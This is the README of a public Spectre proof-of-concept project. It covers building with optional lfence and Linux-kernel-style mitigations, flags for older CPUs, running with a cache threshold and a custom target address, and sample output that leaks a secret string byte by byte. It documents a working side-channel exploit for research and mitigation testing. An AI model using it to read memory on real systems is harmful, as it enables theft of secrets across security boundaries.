# SpectrePoC

Proof of concept code for the Spectre CPU exploit.

## Attribution

The source code originates from the example code provided in the "Spectre Attacks: Exploiting Speculative Execution" paper found here:

https://spectreattack.com/spectre.pdf

The original source code used in this repository was conveniently provided by Erik August's gist, found here: https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6

The code has been modified to fix build issues, add workaround for older CPUs, and improve comments where possible.

## Building

The project can be built with GNU Make and GCC.

On debian these are included in the `build-essential` metapackage.

Building is as easy as:

`cd SpectrePoC`

`make`

The output binary is `./spectre.out`.

### Mitigations

Several mitigations are available for Spectre.

These can be can be optionally compiled into the binary in order to test their effectiveness on various processors.

#### Intel lfence style mitigation

If you want to build a version with Intel's lfence mitigation included, set your `CFLAGS`

`CFLAGS=-DINTEL_MITIGATION`

in the `Makefile` or build like

`CFLAGS=-DINTEL_MITIGATION make`

#### Linux kernel style mitigation

If you want to build a version with Linux kernel array_index_mask_nospec() mitigation included, set your `CFLAGS`

`CFLAGS=-DLINUX_KERNEL_MITIGATION`

in the `Makefile` or build like

`CFLAGS=-DLINUX_KERNEL_MITIGATION make`

### Building for older CPUs

Depending on the CPU, certain instructions will need to be disabled in order for the program to run correctly.

The instructions in question are:

#### rdtscp:

Introduced with x86-64.
All 32-bit only CPUs, including many Core 2 Duos, will need to disable this instruction.

To build the project without `rdtscp`, define the NORDTSCP cflag:

`CFLAGS=-DNORDTSCP make` 

#### mfence:
Introduced with SSE2.
Most CPUs pre-Pentium 4 will need to disable this instruction.

To build the project without `mfence`, define the NOMFENCE cflag:

`CFLAGS=-DNOMFENCE make`

#### clflush
Introduced with SSE2.
Most CPUs pre-Pentium 4 will need to disable this instruction.

To build the project without `clflush`, define the NOCLFLUSH cflag:

`CFLAGS=-DNOCLFLUSH make`

#### Multiple cflags

To define multiple cflags, separate each cflag with an escaped space. For example:

`CFLAGS=-DNORDTSCP\ -DNOMFENCE\ -DNOCLFLUSH make`

#### SSE2 instruction set

To build the project without all of the above instructions introduced with SSE2, define NOSSE2 cflag:

`CFLAGS=-DNOSSE2 make`

`NOSSE2` is automatically enabled if the `__SSE__` flag is present but `__SSE2__` is absent.
This means `NOSSE2` shouldn't need to be manually specified when compiling on Clang or GCC on non-SSE2 processors.

On MSC, `NOSSE2` is automatically enabled if the `_M_IX86_FP` flag is set to `1` (indicating SSE support, but no SSE2 support).
MSC will set this by default for all x86 processors.

#### 'Target specific option mismatch' error

Some 32-bit versions of gcc (e.g. the version used in Ubuntu 14.04) may show the following error while compiling the PoC:

```
/usr/lib/gcc/i686-linux-gnu/5/include/emmintrin.h:1479:1: error:
  inlining failed in call to always_inline
`_mm_clflush`: target specific option mismatch
 _mm_clflush (void const *__A)
 ^
```

In this case architecture build flag `-march=native` is required for compilation for the current CPU:

`CFLAGS=-march=native make`

This flag builds the binary specifically for the current CPU and it may crash after copying to another machine.

### Building it without using the Makefile

If you want to build it manually, make sure to disable all optimisations (aka, don't use -O2), as it will break the program.

## Executing

To run spectre with default cache hit threshold of 80, and the secret example string "The Magic Words are Squeamish Ossifrage." as the target, run `./spectre.out` with no command line arguments.

**Example:** `./spectre.out`

The cache hit threshold can be specified as the first command line argument. It must be a whole positive integer.

**Example:** `./spectre.out 80`

A custom target address and length can be given as the second and third command line arguments, respectively.

**Example:** `./spectre.out 80 12345678 128`

## Tweaking

If you're getting lackluster results, you may need to tweak the cache hit threshold. This can be done by providing a threshold as the first command line argument.

While a value of 80 appears to work for most desktop CPUs, a larger value may be required for slower CPUs, and the newest desktop CPUs can go as low as 15.
For example, on an Intel(R) Core(TM) i7-8650U CPU (Surface Book 2), a value of 20 works well. On a slower, integrated AMD GX-412TC SOC (PC Engines APU3), a value of 100-300 was required to get a good result.

## Contributing

Feel free to add your results to the "Results" issue. Include your cache hit threshold, OS details, CPU details like vendor Id, family, model name, stepping, microcode, MHz, and cache size. The OS can be found by running `uname -a`. CPU info can be found by running `cat /proc/cpuinfo` on Linux, and `sysctl -a | grep machdep.cpu` on OSX.

## Example output

The following was output on an Intel(R) Core(TM) i7-8650U CPU, with a cache hit threshold of 20:

`./spectre.out 20:`

```
Version: commit 04c47db298920eb4d1b7c1bafcd0017a72d415bc
Using a cache hit threshold of 20.
Build: RDTSCP_SUPPORTED MFENCE_SUPPORTED CLFLUSH_SUPPORTED INTEL_MITIGATION_DISABLED LINUX_KERNEL_MITIGATION_DISABLED
Reading 40 bytes:
Reading at malicious_x = 0xffffffffffdfeeb8... Success: 0x54=’T’ score=187 (second best: 0x00=’?’ score=92)
Reading at malicious_x = 0xffffffffffdfeeb9... Unclear: 0x68=’h’ score=967 (second best: 0x00=’?’ score=486)
Reading at malicious_x = 0xffffffffffdfeeba... Unclear: 0x65=’e’ score=985 (second best: 0x00=’?’ score=566)
Reading at malicious_x = 0xffffffffffdfeebb... Unclear: 0x20=’ ’ score=965 (second best: 0x00=’?’ score=659)
Reading at malicious_x = 0xffffffffffdfeebc... Unclear: 0x4D=’M’ score=978 (second best: 0x00=’?’ score=700)
Reading at malicious_x = 0xffffffffffdfeebd... Unclear: 0x61=’a’ score=967 (second best: 0x00=’?’ score=654)
Reading at malicious_x = 0xffffffffffdfeebe... Success: 0x67=’g’ score=705 (second best: 0x00=’?’ score=345)
Reading at malicious_x = 0xffffffffffdfeebf... Unclear: 0x69=’i’ score=974 (second best: 0x6A=’j’ score=768)
Reading at malicious_x = 0xffffffffffdfeec0... Unclear: 0x63=’c’ score=615 (second best: 0x00=’?’ score=310)
Reading at malicious_x = 0xffffffffffdfeec1... Success: 0x20=’ ’ score=2
Reading at malicious_x = 0xffffffffffdfeec2... Success: 0x57=’W’ score=13 (second best: 0x00=’?’ score=3)
Reading at malicious_x = 0xffffffffffdfeec3... Success: 0x6F=’o’ score=17 (second best: 0x00=’?’ score=1)
Reading at malicious_x = 0xffffffffffdfeec4... Success: 0x72=’r’ score=11 (second best: 0x00=’?’ score=4)
Reading at malicious_x = 0xffffffffffdfeec5... Unclear: 0x64=’d’ score=7 (second best: 0x00=’?’ score=6)
Reading at malicious_x = 0xffffffffffdfeec6... Success: 0x73=’s’ score=31 (second best: 0x00=’?’ score=13)
Reading at malicious_x = 0xffffffffffdfeec7... Unclear: 0x20=’ ’ score=7 (second best: 0x00=’?’ score=6)
Reading at malicious_x = 0xffffffffffdfeec8... Success: 0x61=’a’ score=43 (second best: 0x00=’?’ score=20)
Reading at malicious_x = 0xffffffffffdfeec9... Success: 0x72=’r’ score=189 (second best: 0x00=’?’ score=91)
Reading at malicious_x = 0xffffffffffdfeeca... Success: 0x65=’e’ score=2
Reading at malicious_x = 0xffffffffffdfeecb... Unclear: 0x20=’ ’ score=7 (second best: 0x00=’?’ score=6)
Reading at malicious_x = 0xffffffffffdfeecc... Unclear: 0x53=’S’ score=151 (second best: 0x00=’?’ score=78)
Reading at malicious_x = 0xffffffffffdfeecd... Success: 0x71=’q’ score=57 (second best: 0x00=’?’ score=26)
Reading at malicious_x = 0xffffffffffdfeece... Success: 0x00=’?’ score=5
Reading at malicious_x = 0xffffffffffdfeecf... Success: 0x65=’e’ score=33 (second best: 0x00=’?’ score=14)
Reading at malicious_x = 0xffffffffffdfeed0... Success: 0x61=’a’ score=115 (second best: 0x62=’b’ score=55)
Reading at malicious_x = 0xffffffffffdfeed1... Unclear: 0x6D=’m’ score=21 (second best: 0x00=’?’ score=15)
Reading at malicious_x = 0xffffffffffdfeed2... Unclear: 0x69=’i’ score=961 (second best: 0x6A=’j’ score=593)
Reading at malicious_x = 0xffffffffffdfeed3... Success: 0x73=’s’ score=37 (second best: 0x00=’?’ score=18)
Reading at malicious_x = 0xffffffffffdfeed4... Success: 0x68=’h’ score=253 (second best: 0x00=’?’ score=122)
Reading at malicious_x = 0xffffffffffdfeed5... Unclear: 0x20=’ ’ score=9 (second best: 0x00=’?’ score=5)
Reading at malicious_x = 0xffffffffffdfeed6... Success: 0x4F=’O’ score=315 (second best: 0x00=’?’ score=156)
Reading at malicious_x = 0xffffffffffdfeed7... Success: 0x73=’s’ score=21 (second best: 0x00=’?’ score=8)
Reading at malicious_x = 0xffffffffffdfeed8... Success: 0x73=’s’ score=27 (second best: 0x00=’?’ score=9)
Reading at malicious_x = 0xffffffffffdfeed9... Success: 0x69=’i’ score=51 (second best: 0x00=’?’ score=16)
Reading at malicious_x = 0xffffffffffdfeeda... Success: 0x66=’f’ score=2
Reading at malicious_x = 0xffffffffffdfeedb... Unclear: 0x72=’r’ score=53 (second best: 0x00=’?’ score=31)
Reading at malicious_x = 0xffffffffffdfeedc... Success: 0x61=’a’ score=7 (second best: 0x00=’?’ score=3)
Reading at malicious_x = 0xffffffffffdfeedd... Success: 0x67=’g’ score=2
Reading at malicious_x = 0xffffffffffdfeede... Success: 0x65=’e’ score=2
Reading at malicious_x = 0xffffffffffdfeedf... Success: 0x2E=’.’ score=35 (second best: 0x00=’?’ score=8)
```
